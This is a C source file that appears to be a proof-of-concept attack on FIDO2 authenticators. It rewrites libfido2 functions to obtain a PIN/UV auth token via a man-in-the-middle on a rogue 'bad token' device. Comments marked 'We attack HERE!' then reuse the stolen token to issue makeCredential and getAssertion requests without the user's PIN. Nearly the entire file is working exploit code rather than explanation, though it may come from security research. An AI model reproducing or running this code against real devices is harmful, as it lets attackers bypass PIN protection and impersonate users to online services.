#include "token_operations.h"


int get_dev_file_descriptor(fido_dev_t *dev) {

    if (dev == NULL) {
        errx(1, "[%s]: dev is NULL", __func__);
    }

    if (dev->io_handle == NULL) {
        errx(1, "[%s]: dev->io_handle is NULL");
    }

    struct hid_linux *ctx = dev->io_handle;

    return ctx->fd;

}

fido_dev_t* open_bad_token() {

	char bad_token_path[20];

	int got_token_path = get_bad_token_path(bad_token_path, 1);

	if (got_token_path < 0) {
		fido_log_debug(1, "[%s]: Could not get bad token path!", __func__);

		if (got_token_path == -1) {
			return NULL;
		}
		else
			errx(1, "[%s]: Something went wrong trying to find the bad token's path. Aborting!");
	}

	fido_dev_t *bad_token_dev = open_dev_mod(bad_token_path);

	if (bad_token_dev == NULL) {
		errx(1, "[%s]: open_dev_mod returned NULL", __func__);
	}

	return bad_token_dev;
}

fido_dev_t* open_user_token() {

	char bad_token_path[20];

	int path_length = get_token_path(bad_token_path);

	if (path_length <= 0) {
		fido_log_debug(1, "[%s]: Could not get bad token path!", __func__);

		if (path_length == -1) {
			return NULL;
		}
		else
			errx(1, "[%s]: Something went wrong trying to find the bad token's path. Aborting!");
	}

	bad_token_path[path_length] = '\0';

	fido_dev_t *bad_token_dev = open_dev_mod(bad_token_path);

	if (bad_token_dev == NULL) {
		errx(1, "[%s]: open_dev_mod returned NULL", __func__);
	}

	return bad_token_dev;
}


/*

Below are modified functions from the libfido2 library, meant to change some behavior needed to correctly apply the attack.

*/

int fido_do_ecdh_mod(fido_dev_t *dev, es256_pk_t **pk, fido_blob_t **ecdh, int *ms)
{
	es256_sk_t *sk = NULL; /* our private key */
	es256_pk_t *ak = NULL; /* authenticator's public key */
	int r;

	*pk = NULL;
	*ecdh = NULL;
	if ((sk = es256_sk_new_mod()) == NULL || (*pk = es256_pk_new()) == NULL) {
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}
	if (es256_sk_create_mod(sk) < 0 || es256_derive_pk_mod(sk, *pk) < 0) {
		fido_log_debug("%s: es256_derive_pk", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}
	if ((ak = es256_pk_new()) == NULL ||
	    fido_dev_authkey(dev, ak, ms) != FIDO_OK) {
		fido_log_debug("%s: fido_dev_authkey", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}
	if (do_ecdh_mod(dev, sk, ak, ecdh, CTAP_PIN_PROTOCOL1) < 0) {
		fido_log_debug("%s: do_ecdh", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	r = FIDO_OK;
fail:
	es256_sk_free_mod(&sk);
	es256_pk_free(&ak);

	if (r != FIDO_OK) {
		es256_pk_free(pk);
		fido_blob_free(ecdh);
	}

	return r;
}

static int
pin_sha256_enc(const fido_dev_t *dev, const fido_blob_t *shared,
    const fido_blob_t *pin, fido_blob_t **out)
{
	fido_blob_t	*ph = NULL;
	int		 r;

	if ((*out = fido_blob_new()) == NULL ||
	    (ph = fido_blob_new()) == NULL) {
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	if (fido_sha256(ph, pin->ptr, pin->len) < 0 || ph->len < 16) {
		fido_log_debug("%s: SHA256", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	ph->len = 16; /* first 16 bytes */

	if (aes256_cbc_enc((int)fido_dev_get_pin_protocol(dev), shared, ph, *out) < 0) {
		fido_log_debug("%s: aes256_cbc_enc", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	r = FIDO_OK;
fail:
	fido_blob_free(&ph);

	return (r);
}


/*

	START GET PIN TOKEN CODE

*/

static int
ctap20_uv_token_tx(fido_dev_t *dev, const char *pin, const fido_blob_t *ecdh,
    const es256_pk_t *pk, int *ms)
{
	fido_blob_t	 f;
	fido_blob_t	*p = NULL;
	fido_blob_t	*phe = NULL;
	cbor_item_t	*argv[6];
	int		 r;

	memset(&f, 0, sizeof(f));
	memset(argv, 0, sizeof(argv));

	if (pin == NULL) {
		fido_log_debug("%s: NULL pin", __func__);
		r = FIDO_ERR_PIN_REQUIRED;
		goto fail;
	}

	if ((p = fido_blob_new()) == NULL || fido_blob_set(p,
	    (const unsigned char *)pin, strlen(pin)) < 0) {
		fido_log_debug("%s: fido_blob_set", __func__);
		r = FIDO_ERR_INVALID_ARGUMENT;
		goto fail;
	}

	if ((r = pin_sha256_enc(dev, ecdh, p, &phe)) != FIDO_OK) {
		fido_log_debug("%s: pin_sha256_enc", __func__);
		goto fail;
	}

	if ((argv[0] = cbor_encode_pin_opt(dev)) == NULL ||
	    (argv[1] = cbor_build_uint8(5)) == NULL ||
	    (argv[2] = es256_pk_encode_mod(pk, 1)) == NULL ||
	    (argv[5] = fido_blob_encode(phe)) == NULL) {
		fido_log_debug("%s: cbor encode", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	if (cbor_build_frame(CTAP_CBOR_CLIENT_PIN, argv, nitems(argv),
	    &f) < 0 || fido_tx(dev, CTAP_CMD_CBOR, f.ptr, f.len, ms) < 0) {
		fido_log_debug("%s: fido_tx", __func__);
		r = FIDO_ERR_TX;
		goto fail;
	}

	r = FIDO_OK;
fail:
	cbor_vector_free(argv, nitems(argv));
	fido_blob_free(&p);
	fido_blob_free(&phe);
	free(f.ptr);

	return (r);
}

static cbor_item_t * encode_uv_permission(uint8_t cmd)
{
	switch (cmd) {
	case CTAP_CBOR_ASSERT:
		return (cbor_build_uint8(CTAP21_UV_TOKEN_PERM_ASSERT));
	case CTAP_CBOR_BIO_ENROLL_PRE:
		return (cbor_build_uint8(CTAP21_UV_TOKEN_PERM_BIO));
	case CTAP_CBOR_CONFIG:
		return (cbor_build_uint8(CTAP21_UV_TOKEN_PERM_CONFIG));
	case CTAP_CBOR_MAKECRED:
		return (cbor_build_uint8(CTAP21_UV_TOKEN_PERM_MAKECRED));
	case CTAP_CBOR_CRED_MGMT_PRE:
		return (cbor_build_uint8(CTAP21_UV_TOKEN_PERM_CRED_MGMT));
	case CTAP_CBOR_LARGEBLOB:
		return (cbor_build_uint8(CTAP21_UV_TOKEN_PERM_LARGEBLOB));
	default:
		fido_log_debug("%s: cmd 0x%02x", __func__, cmd);
		return (NULL);
	}
}

static int
ctap21_uv_token_tx(fido_dev_t *dev, const char *pin, const fido_blob_t *ecdh,
    const es256_pk_t *pk, uint8_t cmd, const char *rpid, int *ms)
{
	fido_blob_t	 f;
	fido_blob_t	*p = NULL;
	fido_blob_t	*phe = NULL;
	cbor_item_t	*argv[10];
	uint8_t		 subcmd;
	int		 r;

	memset(&f, 0, sizeof(f));
	memset(argv, 0, sizeof(argv));

	if (pin != NULL) {
		if ((p = fido_blob_new()) == NULL || fido_blob_set(p,
		    (const unsigned char *)pin, strlen(pin)) < 0) {
			fido_log_debug("%s: fido_blob_set", __func__);
			r = FIDO_ERR_INVALID_ARGUMENT;
			goto fail;
		}
		if ((r = pin_sha256_enc(dev, ecdh, p, &phe)) != FIDO_OK) {
			fido_log_debug("%s: pin_sha256_enc", __func__);
			goto fail;
		}
		subcmd = 9; /* getPinUvAuthTokenUsingPinWithPermissions */
	} else {
		if (fido_dev_has_uv(dev) == false) {
			fido_log_debug("%s: fido_dev_has_uv", __func__);
			r = FIDO_ERR_PIN_REQUIRED;
			goto fail;
		}
		subcmd = 6; /* getPinUvAuthTokenUsingUvWithPermissions */
	}

	if ((argv[0] = cbor_encode_pin_opt(dev)) == NULL ||
	    (argv[1] = cbor_build_uint8(subcmd)) == NULL ||
	    (argv[2] = es256_pk_encode_mod(pk, 1)) == NULL ||
	    (phe != NULL && (argv[5] = fido_blob_encode(phe)) == NULL) ||
	    (argv[8] = encode_uv_permission(cmd)) == NULL ||
	    (rpid != NULL && (argv[9] = cbor_build_string(rpid)) == NULL)) {
		fido_log_debug("%s: cbor encode", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	if (cbor_build_frame(CTAP_CBOR_CLIENT_PIN, argv, nitems(argv),
	    &f) < 0 || fido_tx(dev, CTAP_CMD_CBOR, f.ptr, f.len, ms) < 0) {
		fido_log_debug("%s:  fido_tx", __func__);
		r = FIDO_ERR_TX;
		goto fail;
	}

	r = FIDO_OK;
fail:
	cbor_vector_free(argv, nitems(argv));
	fido_blob_free(&p);
	fido_blob_free(&phe);
	free(f.ptr);

	return (r);
}

static int
uv_token_rx(fido_dev_t *dev, const fido_blob_t *ecdh, fido_blob_t *token,
    int *ms)
{
	fido_blob_t	*aes_token = NULL;
	unsigned char	 reply[FIDO_MAXMSG];
	int		 reply_len;
	int		 r;

	if ((aes_token = fido_blob_new()) == NULL) {
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	if ((reply_len = fido_rx(dev, CTAP_CMD_CBOR, &reply, sizeof(reply),
	    ms)) < 0) {
		fido_log_debug("%s: fido_rx", __func__);
		r = FIDO_ERR_RX;
		goto fail;
	}

	if ((r = cbor_parse_reply(reply, (size_t)reply_len, aes_token,
	    parse_uv_token)) != FIDO_OK) {
		fido_log_debug("%s: parse_uv_token", __func__);
		goto fail;
	}

	if  (aes256_cbc_dec((int)fido_dev_get_pin_protocol(dev), ecdh, aes_token, token) < 0) {
		fido_log_debug("%s: aes256_cbc_dec", __func__);
		r = FIDO_ERR_RX;
		goto fail;
	}

	r = FIDO_OK;
fail:
	fido_blob_free(&aes_token);

	return (r);
}


static int
uv_token_wait(fido_dev_t *dev, uint8_t cmd, const char *pin,
    const fido_blob_t *ecdh, const es256_pk_t *pk, const char *rpid,
    fido_blob_t *token, int *ms)
{
	int r;

	if (ecdh == NULL || pk == NULL)
		return (FIDO_ERR_INVALID_ARGUMENT);
	if (fido_dev_supports_permissions(dev))
		r = ctap21_uv_token_tx(dev, pin, ecdh, pk, cmd, rpid, ms);
	else
		r = ctap20_uv_token_tx(dev, pin, ecdh, pk, ms);
	if (r != FIDO_OK)
		return (r);

	return (uv_token_rx(dev, ecdh, token, ms));
}


int
fido_dev_get_uv_token(fido_dev_t *dev, uint8_t cmd, const char *pin,
    const fido_blob_t *ecdh, const es256_pk_t *pk, const char *rpid,
    fido_blob_t *token, int *ms)
{
	return (uv_token_wait(dev, cmd, pin, ecdh, pk, rpid, token, ms));
}


int get_pin_token(state_helper_t *helper) {

	es256_pk_t *pk = NULL;
	fido_blob_t *ecdh = NULL;
	int ms = helper->bad_token_dev->timeout_ms;

	attack_log("Will do ECDH with file descriptor FD: %d\n", helper->bad_token_fd);

	int r = fido_do_ecdh_mod(helper->bad_token_dev, &pk, &ecdh, &ms);

	attack_log("ECDH RESULT: %s (r == %d)\n", (r == FIDO_OK) ? "OK" : "FAILED", r);

	helper->bad_token_ecdh_secret = ecdh;

	if (r != FIDO_OK) {
		return r;
	}

	fido_blob_t* token = NULL;
	if ((token = fido_blob_new()) == NULL) {
		attack_log("Could not initialize pin token structure!\n");
		return -1;
	}
	r = fido_dev_get_uv_token(helper->bad_token_dev, CTAP_CBOR_MAKECRED, helper->bad_token_pin, helper->bad_token_ecdh_secret, pk, "webauthn.io", token, &(helper->bad_token_dev->timeout_ms));

	helper->bad_token_pin_token = token;

	if (r != FIDO_OK) {
		attack_log("[%s] failed, could not get pin token!\n", "fido_dev_get_uv_token");
		return r;
	}

	return 0;
}

/*

	END GET PIN TOKEN CODE
 
*/


/*

	START ASSERT CODE

*/

static int fido_dev_get_assert_tx(fido_dev_t *dev, fido_assert_t *assert,
    const es256_pk_t *pk, const fido_blob_t *ecdh, fido_blob_t* pin_token, int *ms)
{
	fido_blob_t	 f;
	fido_opt_t	 uv = assert->uv;
	cbor_item_t	*argv[7];
	const uint8_t	 cmd = CTAP_CBOR_ASSERT;
	int		 r;

	memset(argv, 0, sizeof(argv));
	memset(&f, 0, sizeof(f));

	/* do we have everything we need? */
	if (assert->rp_id == NULL || assert->cdh.ptr == NULL) {
		fido_log_debug("%s: rp_id=%p, cdh.ptr=%p", __func__,
		    (void *)assert->rp_id, (void *)assert->cdh.ptr);
		r = FIDO_ERR_INVALID_ARGUMENT;
		goto fail;
	}

	if ((argv[0] = cbor_build_string(assert->rp_id)) == NULL ||
	    (argv[1] = fido_blob_encode(&assert->cdh)) == NULL) {
		fido_log_debug("%s: cbor encode", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	/* allowed credentials */
	if (assert->allow_list.len) {
		const fido_blob_array_t *cl = &assert->allow_list;
		if ((argv[2] = cbor_encode_pubkey_list(cl)) == NULL) {
			fido_log_debug("%s: cbor_encode_pubkey_list", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}
	}

	if (assert->ext.mask)
		if ((argv[3] = cbor_encode_assert_ext(dev, &assert->ext, ecdh,
		    pk)) == NULL) {
			fido_log_debug("%s: cbor_encode_assert_ext", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}

	/* user verification */
	// We attack HERE! We use the MITM stolen pin token to authenticate the call without needing the PIN
	if (pin_token != NULL || (uv == FIDO_OPT_TRUE && fido_dev_supports_permissions(dev))) {
			
			argv[5] = cbor_encode_pin_auth(fido_dev_get_pin_protocol(dev), pin_token, &assert->cdh);
			argv[6] = cbor_encode_pin_opt(dev);

			uv = FIDO_OPT_OMIT;
	}

	/* options */
	if (assert->up != FIDO_OPT_OMIT || uv != FIDO_OPT_OMIT)
		if ((argv[4] = cbor_encode_assert_opt(assert->up, uv)) == NULL) {
			fido_log_debug("%s: cbor_encode_assert_opt", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}

	/* frame and transmit */
	if (cbor_build_frame(cmd, argv, nitems(argv), &f) < 0 ||
	    fido_tx(dev, CTAP_CMD_CBOR, f.ptr, f.len, ms) < 0) {
		fido_log_debug("%s: fido_tx", __func__);
		r = FIDO_ERR_TX;
		goto fail;
	}

	r = FIDO_OK;
fail:
	cbor_vector_free(argv, nitems(argv));
	free(f.ptr);

	return (r);
}

static void fido_assert_reset_extattr(fido_assert_extattr_t *ext)
{
	fido_blob_reset(&ext->hmac_secret_enc);
	fido_blob_reset(&ext->blob);
	memset(ext, 0, sizeof(*ext));
}

static void fido_assert_reset_rx(fido_assert_t *assert)
{
	for (size_t i = 0; i < assert->stmt_cnt; i++) {
		free(assert->stmt[i].user.icon);
		free(assert->stmt[i].user.name);
		free(assert->stmt[i].user.display_name);
		fido_blob_reset(&assert->stmt[i].user.id);
		fido_blob_reset(&assert->stmt[i].id);
		fido_blob_reset(&assert->stmt[i].hmac_secret);
		fido_blob_reset(&assert->stmt[i].authdata_cbor);
		fido_blob_reset(&assert->stmt[i].largeblob_key);
		fido_blob_reset(&assert->stmt[i].sig);
		fido_assert_reset_extattr(&assert->stmt[i].authdata_ext);
		memset(&assert->stmt[i], 0, sizeof(assert->stmt[i]));
	}
	free(assert->stmt);
	assert->stmt = NULL;
	assert->stmt_len = 0;
	assert->stmt_cnt = 0;
}

static int fido_dev_get_assert_rx(fido_dev_t *dev, fido_assert_t *assert, int *ms)
{
	unsigned char	reply[FIDO_MAXMSG];
	int		reply_len;
	int		r;

	fido_assert_reset_rx(assert);

	if ((reply_len = fido_rx(dev, CTAP_CMD_CBOR, &reply, sizeof(reply),
	    ms)) < 0) {
		fido_log_debug("%s: fido_rx", __func__);
		return (FIDO_ERR_RX);
	}

	/* start with room for a single assertion */
	if ((assert->stmt = calloc(1, sizeof(fido_assert_stmt))) == NULL)
		return (FIDO_ERR_INTERNAL);

	assert->stmt_len = 0;
	assert->stmt_cnt = 1;

	/* adjust as needed */
	if ((r = cbor_parse_reply(reply, (size_t)reply_len, assert,
	    adjust_assert_count)) != FIDO_OK) {
		fido_log_debug("%s: adjust_assert_count", __func__);
		return (r);
	}

	/* parse the first assertion */
	if ((r = cbor_parse_reply(reply, (size_t)reply_len,
	    &assert->stmt[assert->stmt_len], parse_assert_reply)) != FIDO_OK) {
		fido_log_debug("%s: parse_assert_reply", __func__);
		return (r);
	}

	assert->stmt_len++;

	return (FIDO_OK);
}

static int fido_get_next_assert_tx(fido_dev_t *dev, int *ms)
{
	const unsigned char cbor[] = { CTAP_CBOR_NEXT_ASSERT };

	if (fido_tx(dev, CTAP_CMD_CBOR, cbor, sizeof(cbor), ms) < 0) {
		fido_log_debug("%s: fido_tx", __func__);
		return (FIDO_ERR_TX);
	}

	return (FIDO_OK);
}

static int
fido_get_next_assert_rx(fido_dev_t *dev, fido_assert_t *assert, int *ms)
{
	unsigned char	reply[FIDO_MAXMSG];
	int		reply_len;
	int		r;

	if ((reply_len = fido_rx(dev, CTAP_CMD_CBOR, &reply, sizeof(reply),
	    ms)) < 0) {
		fido_log_debug("%s: fido_rx", __func__);
		return (FIDO_ERR_RX);
	}

	/* sanity check */
	if (assert->stmt_len >= assert->stmt_cnt) {
		fido_log_debug("%s: stmt_len=%zu, stmt_cnt=%zu", __func__,
		    assert->stmt_len, assert->stmt_cnt);
		return (FIDO_ERR_INTERNAL);
	}

	if ((r = cbor_parse_reply(reply, (size_t)reply_len,
	    &assert->stmt[assert->stmt_len], parse_assert_reply)) != FIDO_OK) {
		fido_log_debug("%s: parse_assert_reply", __func__);
		return (r);
	}

	return (FIDO_OK);
}


static int fido_dev_get_assert_wait(fido_dev_t *dev, fido_assert_t *assert,
    const es256_pk_t *pk, const fido_blob_t *ecdh, fido_blob_t* pin_token, int *ms)
{
	int r;

	if ((r = fido_dev_get_assert_tx(dev, assert, pk, ecdh, pin_token,
	    ms)) != FIDO_OK ||
	    (r = fido_dev_get_assert_rx(dev, assert, ms)) != FIDO_OK)
		return (r);

	while (assert->stmt_len < assert->stmt_cnt) {
		if ((r = fido_get_next_assert_tx(dev, ms)) != FIDO_OK ||
		    (r = fido_get_next_assert_rx(dev, assert, ms)) != FIDO_OK)
			return (r);
		assert->stmt_len++;
	}

	return (FIDO_OK);
}

static void fido_cred_reset_tx(fido_cred_t *cred)
{
	fido_blob_reset(&cred->cd);
	fido_blob_reset(&cred->cdh);
	fido_blob_reset(&cred->user.id);
	fido_blob_reset(&cred->blob);

	free(cred->rp.id);
	free(cred->rp.name);
	free(cred->user.icon);
	free(cred->user.name);
	free(cred->user.display_name);
	fido_free_blob_array(&cred->excl);

	memset(&cred->rp, 0, sizeof(cred->rp));
	memset(&cred->user, 0, sizeof(cred->user));
	memset(&cred->excl, 0, sizeof(cred->excl));
	memset(&cred->ext, 0, sizeof(cred->ext));

	cred->type = 0;
	cred->rk = FIDO_OPT_OMIT;
	cred->uv = FIDO_OPT_OMIT;
}

static void fido_cred_clean_attstmt(fido_attstmt_t *attstmt)
{
	fido_blob_reset(&attstmt->certinfo);
	fido_blob_reset(&attstmt->pubarea);
	fido_blob_reset(&attstmt->cbor);
	fido_blob_reset(&attstmt->x5c);
	fido_blob_reset(&attstmt->sig);

	memset(attstmt, 0, sizeof(*attstmt));
}

static void fido_cred_clean_authdata(fido_cred_t *cred)
{
	fido_blob_reset(&cred->authdata_cbor);
	fido_blob_reset(&cred->authdata_raw);
	fido_blob_reset(&cred->attcred.id);

	memset(&cred->authdata_ext, 0, sizeof(cred->authdata_ext));
	memset(&cred->authdata, 0, sizeof(cred->authdata));
	memset(&cred->attcred, 0, sizeof(cred->attcred));
}

static void fido_cred_reset_rx(fido_cred_t *cred)
{
	free(cred->fmt);
	cred->fmt = NULL;
	fido_cred_clean_authdata(cred);
	fido_cred_clean_attstmt(&cred->attstmt);
	fido_blob_reset(&cred->largeblob_key);
}

static int fido_dev_make_cred_tx(fido_dev_t *dev, fido_cred_t *cred, fido_blob_t* pin_token, int *ms)
{
	fido_blob_t	 f;
	fido_blob_t	*ecdh = NULL;
	fido_opt_t	 uv = cred->uv;
	es256_pk_t	*pk = NULL;
	cbor_item_t	*argv[9];
	const uint8_t	 cmd = CTAP_CBOR_MAKECRED;
	int		 r;

	memset(&f, 0, sizeof(f));
	memset(argv, 0, sizeof(argv));

	if (cred->cdh.ptr == NULL || cred->type == 0) {
		fido_log_debug("%s: cdh=%p, type=%d", __func__,
		    (void *)cred->cdh.ptr, cred->type);
		r = FIDO_ERR_INVALID_ARGUMENT;
		goto fail;
	}

	if ((argv[0] = fido_blob_encode(&cred->cdh)) == NULL ||
	    (argv[1] = cbor_encode_rp_entity(&cred->rp)) == NULL ||
	    (argv[2] = cbor_encode_user_entity(&cred->user)) == NULL ||
	    (argv[3] = cbor_encode_pubkey_param(cred->type)) == NULL) {
		fido_log_debug("%s: cbor encode", __func__);
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	/* excluded credentials */
	if (cred->excl.len)
		if ((argv[4] = cbor_encode_pubkey_list(&cred->excl)) == NULL) {
			fido_log_debug("%s: cbor_encode_pubkey_list", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}

	/* extensions */
	if (cred->ext.mask)
		if ((argv[5] = cbor_encode_cred_ext(&cred->ext,
		    &cred->blob)) == NULL) {
			fido_log_debug("%s: cbor_encode_cred_ext", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}

	/* user verification */
	// We attack HERE! We use the MITM stolen pin token to authenticate the call without needing the PIN
	if (pin_token != NULL || (uv == FIDO_OPT_TRUE && fido_dev_supports_permissions(dev))) {

			argv[7] = cbor_encode_pin_auth(fido_dev_get_pin_protocol(dev), pin_token, &cred->cdh);
			argv[8] = cbor_encode_pin_opt(dev);

			uv = FIDO_OPT_OMIT;
	}

	/* options */
	if (cred->rk != FIDO_OPT_OMIT || uv != FIDO_OPT_OMIT)
		if ((argv[6] = cbor_encode_cred_opt(cred->rk, uv)) == NULL) {
			fido_log_debug("%s: cbor_encode_cred_opt", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}

	/* framing and transmission */
	if (cbor_build_frame(cmd, argv, nitems(argv), &f) < 0 ||
	    fido_tx(dev, CTAP_CMD_CBOR, f.ptr, f.len, ms) < 0) {
		fido_log_debug("%s: fido_tx", __func__);
		r = FIDO_ERR_TX;
		goto fail;
	}

	r = FIDO_OK;
fail:
	es256_pk_free(&pk);
	fido_blob_free(&ecdh);
	cbor_vector_free(argv, nitems(argv));
	free(f.ptr);

	return (r);
}

static int fido_dev_make_cred_rx(fido_dev_t *dev, fido_cred_t *cred, int *ms)
{
	unsigned char	*reply;
	int		 reply_len;
	int		 r;

	fido_cred_reset_rx(cred);

	if ((reply = malloc(FIDO_MAXMSG_CRED)) == NULL) {
		r = FIDO_ERR_INTERNAL;
		goto fail;
	}

	if ((reply_len = fido_rx(dev, CTAP_CMD_CBOR, reply, FIDO_MAXMSG_CRED,
	    ms)) < 0) {
		fido_log_debug("%s: fido_rx", __func__);
		r = FIDO_ERR_RX;
		goto fail;
	}

	cred->attObject_cbor = *(fido_blob_new());
	cred->attObject_cbor.len = reply_len - 1;
	cred->attObject_cbor.ptr = (unsigned char *)malloc(sizeof(unsigned char) * cred->attObject_cbor.len);
	memcpy(cred->attObject_cbor.ptr, reply + 1, cred->attObject_cbor.len);

	if ((r = cbor_parse_reply(reply, (size_t)reply_len, cred,
	    parse_makecred_reply)) != FIDO_OK) {
		fido_log_debug("%s: parse_makecred_reply", __func__);
		goto fail;
	}

	if (cred->fmt == NULL || fido_blob_is_empty(&cred->authdata_cbor) ||
	    fido_blob_is_empty(&cred->attcred.id)) {
		r = FIDO_ERR_INVALID_CBOR;
		goto fail;
	}

	r = FIDO_OK;
fail:
	free(reply);

	if (r != FIDO_OK)
		fido_cred_reset_rx(cred);

	return (r);
}

static int fido_dev_make_cred_wait(fido_dev_t *dev, fido_cred_t *cred, fido_blob_t* pin_token,
    int *ms)
{
	int  r;

	if ((r = fido_dev_make_cred_tx(dev, cred, pin_token, ms)) != FIDO_OK ||
	    (r = fido_dev_make_cred_rx(dev, cred, ms)) != FIDO_OK)
		return (r);

	return (FIDO_OK);
}


static int decrypt_hmac_secrets(const fido_dev_t *dev, fido_assert_t *assert,
    const fido_blob_t *key)
{
	for (size_t i = 0; i < assert->stmt_cnt; i++) {
		fido_assert_stmt *stmt = &assert->stmt[i];
		if (stmt->authdata_ext.hmac_secret_enc.ptr != NULL) {
			if (aes256_cbc_dec(fido_dev_get_pin_protocol(dev), key,
			    &stmt->authdata_ext.hmac_secret_enc,
			    &stmt->hmac_secret) < 0) {
				fido_log_debug("%s: aes256_cbc_dec %zu",
				    __func__, i);
				return (-1);
			}
		}
	}

	return (0);
}

// These functions, in libfido2, can receive a PIN, which is required for UV action normally.
// However, since we did the MITM before calling this function, and have the pin token saved in a file, we already have the Pin Token.
// Since we have the Pin Token, we don't need the PIN at all
int fido_dev_get_assert_mod(fido_dev_t *dev, fido_assert_t *assert, fido_blob_t* pin_token)
{
	fido_blob_t	*ecdh = NULL;
	es256_pk_t	*pk = NULL;
	int		 ms = dev->timeout_ms;
	int		 r;

#ifdef USE_WINHELLO
	if (dev->flags & FIDO_DEV_WINHELLO)
		return (fido_winhello_get_assert(dev, assert, pin, ms));
#endif

	if (assert->rp_id == NULL || assert->cdh.ptr == NULL) {
		fido_log_debug("%s: rp_id=%p, cdh.ptr=%p", __func__,
		    (void *)assert->rp_id, (void *)assert->cdh.ptr);
		return (FIDO_ERR_INVALID_ARGUMENT);
	}

	// We don't really need to keep the compatibility with U2F, just fail if it isn't FIDO2 
	if (fido_dev_is_fido2(dev) == false) {
		// if (pin != NULL || assert->ext.mask != 0)
		// 	return (FIDO_ERR_UNSUPPORTED_OPTION);
		// return (u2f_authenticate(dev, assert, &ms));
		return FIDO_ERR_UNSUPPORTED_OPTION;
	}

	if (pin_token != NULL || (assert->uv == FIDO_OPT_TRUE &&
	    fido_dev_supports_permissions(dev)) ||
	    (assert->ext.mask & FIDO_EXT_HMAC_SECRET)) {
		if ((r = fido_do_ecdh_mod(dev, &pk, &ecdh, &ms)) != FIDO_OK) {
			fido_log_debug("%s: fido_do_ecdh", __func__);
			goto fail;
		}
	}

	r = fido_dev_get_assert_wait(dev, assert, pk, ecdh, pin_token, &ms);
	if (r == FIDO_OK && (assert->ext.mask & FIDO_EXT_HMAC_SECRET))
		if (decrypt_hmac_secrets(dev, assert, ecdh) < 0) {
			fido_log_debug("%s: decrypt_hmac_secrets", __func__);
			r = FIDO_ERR_INTERNAL;
			goto fail;
		}

fail:
	es256_pk_free(&pk);
	fido_blob_free(&ecdh);

	return (r);
}

int fido_dev_make_cred_mod(fido_dev_t *dev, fido_cred_t *cred, fido_blob_t* pin_token)
{
	int ms = dev->timeout_ms;

#ifdef USE_WINHELLO
	if (dev->flags & FIDO_DEV_WINHELLO)
		return (fido_winhello_make_cred(dev, cred, pin, ms));
#endif

	return (fido_dev_make_cred_wait(dev, cred, pin_token, &ms));
}

/*

	END ASSERT CODE

*/

fido_dev_t *fido_dev_new_mod(void)
{
	fido_dev_t *dev;

	if ((dev = calloc(1, sizeof(*dev))) == NULL)
		return (NULL);

	dev->cid = CTAP_CID_BROADCAST;
	dev->timeout_ms = -1;
	dev->io = (fido_dev_io_t) {
		&fido_hid_open,
		&fido_hid_close,
        &fido_hid_real_read,
        &fido_hid_real_write
	};

	return (dev);
}


fido_dev_t *open_dev_mod(const char *path)
{
	fido_dev_t *dev;
	int r;

    attack_log("Opening token with path: [%s]\n", path);

	if ((dev = fido_dev_new_mod()) == NULL)
		errx(1, "fido_dev_new");

	r = fido_dev_open(dev, path);
	if (r != FIDO_OK)
		errx(1, "fido_dev_open %s: %s", path, fido_strerr(r));

	return (dev);
}